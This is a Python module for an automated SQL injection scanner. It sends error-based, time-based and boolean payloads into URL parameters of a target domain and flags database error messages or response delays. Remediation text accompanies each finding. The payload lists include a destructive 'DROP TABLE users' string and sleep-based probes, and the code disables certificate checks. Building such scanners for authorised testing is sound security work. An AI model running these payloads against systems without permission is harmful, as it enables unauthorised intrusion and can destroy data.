"""
SQL Injection Scanner — tests parameters for error-based, time-based, and boolean-based SQLi.
"""

import asyncio
import logging
import re
import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)
TIMEOUT = httpx.Timeout(15.0)  # longer for time-based detection
RATE_LIMIT_DELAY = 0.5

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "')",
    "'))",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    '"; DROP TABLE users;--',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(5)--",           5),
    ("; WAITFOR DELAY '0:0:5'--", 5),
    ("' OR pg_sleep(5)--",        5),
    ("1 AND SLEEP(5)",            5),
]

BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", True),
    ("' AND 1=2--", False),
    ("' AND 'a'='a", True),
    ("' AND 'a'='b", False),
]

ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"ora-\d{5}",
    r"postgresql error",
    r"pg_query\(\)",
    r"unclosed quotation mark",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"syntax error.*in query expression",
    r"mssql_query\(\)",
    r"sqlite3.*operationalerror",
    r"sql syntax.*near",
    r"unexpected end of sql command",
]


async def run_sqli(domain: str, endpoints: list[str], emit) -> list[dict]:
    findings = []

    await emit("progress", {"module": "sqli", "step": "collect", "message": "Collecting injection points..."})

    test_targets = []
    for url in endpoints:
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            if params:
                test_targets.append((url, params, "GET"))

    # Also test the main domain with common params
    common_params = ["id", "page", "cat", "product", "user", "item", "order", "ref"]
    for param in common_params:
        base = f"https://{domain}/?{param}=1"
        test_targets.append((base, {param: ["1"]}, "GET"))

    test_targets = test_targets[:30]

    await emit("progress", {"module": "sqli", "step": "error_based", "message": f"Testing {len(test_targets)} targets for error-based SQLi..."})

    tasks = [_test_error_based(url, params, method, emit) for url, params, method in test_targets]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            findings.extend(r)

    # Only run time-based on targets that haven't already been confirmed
    confirmed_params = {(f["evidence"]["url"], f["evidence"].get("parameter")) for f in findings}

    await emit("progress", {"module": "sqli", "step": "time_based", "message": "Testing for time-based blind SQLi..."})

    for url, params, method in test_targets[:10]:
        for param in list(params.keys())[:3]:
            if (url, param) not in confirmed_params:
                time_findings = await _test_time_based(url, params, param, method, emit)
                findings.extend(time_findings)

    await emit("module_complete", {"module": "sqli", "results": findings})
    return findings


async def _test_error_based(url: str, params: dict, method: str, emit) -> list[dict]:
    findings = []

    # Get baseline response
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=True, verify=False) as client:
            baseline = await client.get(url)
            baseline_text = baseline.text.lower()
    except Exception:
        return findings

    for param_name in list(params.keys())[:5]:
        for payload in ERROR_PAYLOADS[:8]:
            test_params = dict(params)
            test_params[param_name] = [payload]

            parsed = urlparse(url)
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))

            try:
                async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=True, verify=False) as client:
                    resp = await client.get(test_url)
                    resp_text = resp.text.lower()

                    for pattern in ERROR_PATTERNS:
                        if re.search(pattern, resp_text) and not re.search(pattern, baseline_text):
                            finding = {
                                "type": "sqli",
                                "subtype": "error_based",
                                "severity": "critical",
                                "title": f"SQL Injection (Error-Based) in '{param_name}'",
                                "description": (
                                    f"The parameter '{param_name}' at {url} triggers SQL error messages. "
                                    "This indicates direct SQL injection — an attacker can extract the entire database."
                                ),
                                "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                "evidence": {
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "error_pattern": pattern,
                                    "snippet": _extract_error_snippet(resp.text, pattern)[:300],
                                },
                            }
                            findings.append(finding)
                            await emit("finding", finding)
                            return findings  # one per URL is sufficient

                await asyncio.sleep(RATE_LIMIT_DELAY)
            except Exception as e:
                logger.debug("SQLi test error %s: %s", test_url, e)

    return findings


async def _test_time_based(url: str, params: dict, param_name: str, method: str, emit) -> list[dict]:
    findings = []

    # Baseline timing
    try:
        start = time.monotonic()
        async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=True, verify=False) as client:
            await client.get(url)
        baseline_time = time.monotonic() - start
    except Exception:
        return findings

    for payload, delay in TIME_PAYLOADS[:2]:
        test_params = dict(params)
        test_params[param_name] = [payload]

        parsed = urlparse(url)
        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))

        try:
            start = time.monotonic()
            async with httpx.AsyncClient(timeout=httpx.Timeout(20.0), follow_redirects=True, verify=False) as client:
                await client.get(test_url)
            elapsed = time.monotonic() - start

            if elapsed >= (baseline_time + delay - 1):  # 1 second tolerance
                finding = {
                    "type": "sqli",
                    "subtype": "time_based_blind",
                    "severity": "critical",
                    "title": f"Blind SQL Injection (Time-Based) in '{param_name}'",
                    "description": (
                        f"The parameter '{param_name}' at {url} caused a {elapsed:.1f}s response delay "
                        f"when injected with '{payload}' (baseline: {baseline_time:.1f}s). "
                        "This indicates time-based blind SQL injection."
                    ),
                    "remediation": "Use parameterized queries. Implement WAF rules to block SQL keywords in parameters.",
                    "evidence": {
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "response_time": round(elapsed, 2),
                        "baseline_time": round(baseline_time, 2),
                    },
                }
                findings.append(finding)
                await emit("finding", finding)
                return findings

            await asyncio.sleep(RATE_LIMIT_DELAY)
        except asyncio.TimeoutError:
            # Timeout itself may indicate the delay worked
            finding = {
                "type": "sqli",
                "subtype": "time_based_blind",
                "severity": "critical",
                "title": f"Possible Blind SQL Injection (Timeout) in '{param_name}'",
                "description": (
                    f"Request to {url} timed out after injecting '{payload}' into '{param_name}'. "
                    "This may indicate successful time-based SQLi."
                ),
                "remediation": "Use parameterized queries. Investigate server-side SQL query construction.",
                "evidence": {
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "result": "timeout",
                },
            }
            findings.append(finding)
            await emit("finding", finding)
            return findings
        except Exception:
            pass

    return findings


def _extract_error_snippet(text: str, pattern: str) -> str:
    """Extract the sentence/line containing the SQL error."""
    lower = text.lower()
    match = re.search(pattern, lower)
    if match:
        start = max(0, match.start() - 50)
        end = min(len(text), match.end() + 200)
        return text[start:end]
    return ""
